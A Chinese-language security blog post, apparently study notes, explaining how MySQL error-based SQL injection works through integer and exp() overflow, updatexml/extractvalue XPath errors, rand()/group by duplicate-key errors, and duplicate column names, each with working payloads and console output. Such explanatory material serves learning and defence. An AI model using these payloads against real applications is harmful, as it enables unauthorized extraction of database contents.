---
layout:		post
title:		"Error Based SQL Injection"
subtitle:	"MYSQL"
date:		2017-02-23
author:		"dogewatch"
header-img:	"img/home-bg-o.jpg"
tags:
    - web
---

# 前言

要找实习找工作了，准备把一些以前零零碎碎掌握的东西总结一下，算是做个准备工作了。

# 正文

SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。

MYSQL报错注入个人认为大体可以分为以下几类：

* BIGINT等数据类型溢出
* xpath语法错误
* concat+rand()+group_by()导致主键重复
* 其他特性

下面就针对这几种错误类型看看背后的原理是怎样的。

## 0x01 数据溢出

这里可以看到mysql是怎么处理整形的：[Integer Types (Exact Value)](https://dev.mysql.com/doc/refman/5.5/en/integer-types.html)，如下表：

| Type      | Storage | Minimum Value        | Maximum Value        |
| --------- | ------- | -------------------- | -------------------- |
|           | (Bytes) | (Signed/Unsigned)    | (Signed/Unsigned)    |
| TINYINT   | 1       | -128                 | 127                  |
|           |         | 0                    | 255                  |
| SMALLINT  | 2       | -32768               | 32767                |
|           |         | 0                    | 65535                |
| MEDIUMINT | 3       | -8388608             | 8388607              |
|           |         | 0                    | 16777215             |
| INT       | 4       | -2147483648          | 2147483647           |
|           |         | 0                    | 4294967295           |
| BIGINT    | 8       | -9223372036854775808 | 9223372036854775807  |
|           |         | 0                    | 18446744073709551615 |

在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明[out-of-range-and-overflow](https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html)，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：

```
mysql> select 18446744073709551615+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
```

在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：

```
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：

```
mysql> select (select * from (select user())x);
+----------------------------------+
| (select * from (select user())x) |
+----------------------------------+
| root@localhost                   |
+----------------------------------+
1 row in set (0.00 sec)

mysql> select !(select * from (select user())x);
+-----------------------------------+
| !(select * from (select user())x) |
+-----------------------------------+
|                                 1 |
+-----------------------------------+
1 row in set (0.01 sec)

mysql> select !(select * from (select user())x)+1;
+-------------------------------------+
| !(select * from (select user())x)+1 |
+-------------------------------------+
|                                   2 |
+-------------------------------------+
1 row in set (0.00 sec)
```

同理，利用exp函数也会产生类似的溢出错误：

```
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```

注入姿势：

```
mysql> select exp(~(select*from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
```

利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：

```
mysql> select (select(!x-~0)from(select(select user())x)a);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
```

而在mysql>5.5.53时，则不能返回查询结果

```
mysql> select (select(!x-~0)from(select(select user())x)a);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(`a`.`x`)) - ~(0))'
```

此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：

```c++
/* Max length of a error message. Should be
kept in sync with MYSQL_ERRMSG_SIZE. */

#define ERRMSGSIZE (512)
```

## 0x02 xpath语法错误

从mysql5.1.5开始提供两个[XML查询和修改的函数](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html)，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:

```
mysql> select extractvalue(1,'/a/b');
+------------------------+
| extractvalue(1,'/a/b') |
+------------------------+
|                        |
+------------------------+
1 row in set (0.01 sec)
```

它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：

```
mysql> select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
mysql> select extractvalue(1,concat(0x7e,(select @@version),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
```

## 0x03 主键重复

这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：

```
mysql> select count(*) from test group by concat(version(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'
```

可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：

```
mysql> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'
```

这种报错方法的本质是因为`floor(rand(0)*2)`的重复性，导致group by语句出错。`group by key`的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：

````
mysql> select * from test;
+------+-------+
| id   | name  |
+------+-------+
| 0    | jack  |
| 1    | jack  |
| 2    | tom   |
| 3    | candy |
| 4    | tommy |
| 5    | jerry |
+------+-------+
6 rows in set (0.00 sec)
````

我们以`select count(*) from test group by name`语句说明大致过程如下：

* 先是建立虚拟表，其中key为主键，不可重复：

| key  | count(*) |
| ---- | -------- |
|      |          |

* 开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：

| key  | count(*) |
| ---- | -------- |
| jack | 1        |

| key  | count(*) |
| ---- | -------- |
| jack | 1+1      |

| key  | count(*) |
| ---- | -------- |
| jack | 1+1      |
| tom  | 1        |

| key   | count(*) |
| ----- | -------- |
| jack  | 1+1      |
| tom   | 1        |
| candy | 1        |
当这个操作遇到rand(0)\*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：

```
mysql> select rand(0) from test;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
|  0.6387474552157777 |
| 0.33109208227236947 |
|  0.7392180764481594 |
|  0.7028141661573334 |
+---------------------+
6 rows in set (0.00 sec)

mysql> select rand(0) from test;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
|  0.6387474552157777 |
| 0.33109208227236947 |
|  0.7392180764481594 |
|  0.7028141661573334 |
+---------------------+
6 rows in set (0.00 sec)
```

同理，floor(rand(0)\*2)则会固定得到011011...的序列(这个很重要)：

```
mysql> select floor(rand(0)*2) from test;
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
|                1 |
+------------------+
6 rows in set (0.00 sec)
```

回到之前的group by语句上，我们将其改为`select count(*) from test group by floor(rand(0)*2)`，看看每一步是什么情况：

* 先建立空表

| key  | count(*) |
| ---- | -------- |
|      |          |

* 取第一条记录，执行`floor(rand(0)*2)`，发现结果为0(第一次计算)，查询虚表，发现没有该键值，则会再计算一次`floor(rand(0)*2)`，将结果1(第二次计算)插入虚表，如下：

| key  | count(*) |
| ---- | -------- |
| 1    | 1        |

* 查第二条记录，再次计算`floor(rand(0)*2)`，发现结果为1(第三次计算)，查询虚表，发现键值1存在，所以此时不在计算第二次，直接count(*)值加1，如下：

| key  | count(*) |
| ---- | -------- |
| 1    | 1+1      |

* 查第三条记录，再次计算`floor(rand(0)*2)`，发现结果为0(第四次计算)，发现键值没有0，则尝试插入记录，此时会又一次计算`floor(rand(0)*2)`，结果1(第5次计算)当作虚表的主键，而此时1这个主键已经存在于虚表中了，所以在插入的时候就会报主键重复的错误了。

* 最终报错的结果，即主键'1'重复：

```
mysql> select count(*) from test group by floor(rand(0)*2);
ERROR 1062 (23000): Duplicate entry '1' for key '<group_key>'
```

整个查询过程中，`floor(rand(0)*2)`被计算了5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。关于这个rand()的问题，官方文档在[这里](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)有个说明：

```
RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations.
```

如果有一个序列开头时`0,1,0`或者`1,0,1`，则无论如何都不会报错了，因为虚表开头两个主键会分别是0和1，后面的就直接count(*)加1了：

```
mysql> select floor(rand(1)*2) from test;
+------------------+
| floor(rand(1)*2) |
+------------------+
|                0 |
|                1 |
|                0 |
|                0 |
|                0 |
|                1 |
+------------------+
6 rows in set (0.00 sec)

mysql> select count(*) from test group by floor(rand(1)*2);
+----------+
| count(*) |
+----------+
|        3 |
|        3 |
+----------+
2 rows in set (0.00 sec)
```

## 0x04 其他特性

### 列名重复

mysql列名重复会报错，我们利用name_const来制造一个列：

```
mysql> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
ERROR 1060 (42S21): Duplicate column name '5.7.17'
```

根据[官方文档](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。

利用这个特性加上join函数可以爆列名：

```
mysql> select *  from(select * from test a join test b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select *  from(select * from test a join test b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'name'
```

### 几何函数

mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：

```
5.5.47
mysql> select multipoint((select * from (select * from (select version())a)b));
ERROR 1367 (22007): Illegal non geometric '(select `b`.`version()` from ((select '5.5.47' AS `version()` from dual) `b`))' value found during parsing
5.7.17
mysql> select multipoint((select * from (select * from (select version())a)b));
ERROR 1367 (22007): Illegal non geometric '(select `a`.`version()` from ((select version() AS `version()`) `a`))' value found during parsing
```

# 后记

暂时就总结这么多了，可能还有遗漏以后再补充。

参考资料：

[http://codecloud.net/60086.html](http://codecloud.net/60086.html)

[http://www.jinglingshu.org/?p=4507](http://www.jinglingshu.org/?p=4507)

[http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html](http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html)